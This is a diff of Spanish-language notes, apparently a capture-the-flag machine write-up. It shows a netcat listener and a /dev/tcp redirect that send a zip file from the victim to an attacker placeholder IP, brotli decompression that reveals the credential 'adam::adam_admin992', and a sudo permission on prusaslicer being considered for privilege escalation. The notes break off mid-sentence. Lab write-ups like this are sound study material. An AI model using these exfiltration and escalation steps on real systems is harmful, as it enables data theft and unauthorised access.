@@ -144,5 +144,14 @@ Maquina atacante -> `nc -nlvp 443 > archivo.zip`
 Maquina victima -> `cat < archivo.zip > /dev/tcp/>IP_Atcante>/443`
 
 Descomprimimos el archivo, y vemos que en una carpeta hay un archivo `.br`
+```ad-info
+La esxtension .br pertenece a un tipo de compresion realizado con brotli
+```
 
+Descomprimimos el archivo con `brotli -d archivo.br`
+Podemos ver que se nos muestra las credenciales de adam
+```ad-hint
+adam::adam_admin992
+```
 
+Con el este usuario podemos ver que al hacer `sudo -l` tenemos permisos de ejecucion en `/opt/PrusaSlicer/prusaslicer` buscamos en internet diferten tipipos de explotacione
